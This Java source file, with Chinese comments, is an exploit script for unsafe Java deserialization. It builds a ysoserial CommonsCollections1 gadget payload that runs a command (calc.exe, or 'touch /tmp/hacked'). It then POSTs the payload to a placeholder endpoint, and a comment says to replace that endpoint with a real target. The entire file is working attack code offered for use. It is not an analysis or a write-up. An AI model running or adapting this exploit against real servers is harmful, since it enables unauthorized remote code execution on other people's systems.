import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import java.io.*;

public class Exploit {
    public static void main(String[] args) throws Exception {
        // 1. 生成 ysoserial 反序列化 payload
        byte[] payload = generatePayload();

        // 2. 目标服务器 URL（请替换为真实目标）
        String targetURL = "http://target-vulnerable-server.com/deserialize";

        // 3. 发送 payload 触发漏洞
        sendExploit(targetURL, payload);
    }

    // 生成 ysoserial 反序列化 payload
    private static byte[] generatePayload() throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(out);

        // **替换 Person 为 ysoserial 生成的 CommonsCollections payload**
        Object payloadObject = new CommonsCollections1().getObject("calc.exe"); // Windows: 打开计算器
        // Object payloadObject = new CommonsCollections1().getObject("touch /tmp/hacked"); // Linux: 创建文件

        oos.writeObject(payloadObject);
        oos.close();
        return out.toByteArray();
    }

    // 发送恶意 payload
    private static void sendExploit(String url, byte[] payload) {
        RestTemplate restTemplate = new RestTemplate();
        HttpEntity<byte[]> entity = new HttpEntity<>(payload);

        try {
            ResponseEntity<String> response = restTemplate.postForEntity(url, entity, String.class);
            System.out.println("[+] 服务器响应: " + response.getStatusCode());
            System.out.println("[+] 响应内容: " + response.getBody());
        } catch (Exception e) {
            System.out.println("[-] 服务器返回错误: " + e.getMessage());
        }
    }
}
